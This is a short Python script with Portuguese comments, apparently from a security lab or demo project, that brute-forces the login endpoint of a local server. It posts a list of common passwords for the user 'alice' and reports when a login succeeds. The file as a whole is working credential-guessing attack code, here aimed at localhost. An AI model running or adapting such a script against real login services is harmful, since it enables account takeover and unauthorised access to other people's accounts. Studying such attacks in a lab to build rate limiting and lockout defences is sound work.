# attacks/brute_force.py

import requests

SERVER_URL = 'http://localhost:5000'
LOGIN_ENDPOINT = '/api/login'

# Usuário alvo
target_username = 'alice'

# Dicionário de senhas (aqui só um exemplo — você pode usar um arquivo de wordlist)
password_list = [
    'password', '123456', 'alice123', 'qwerty', '12345678', '123456789', 'senha', '1234567', '1234567890', '123456'
]

print(f"[BRUTE FORCE] Iniciando brute-force contra o usuário '{target_username}' ...")

for password in password_list:
    response = requests.post(
        SERVER_URL + LOGIN_ENDPOINT,
        json={
            'username': target_username,
            'password': password
        }
    )
    
    if response.status_code == 200:
        print(f"[SUCCESS] Senha encontrada para '{target_username}': {password}")
        break
    else:
        print(f"[FAIL] Tentativa com senha: {password}")
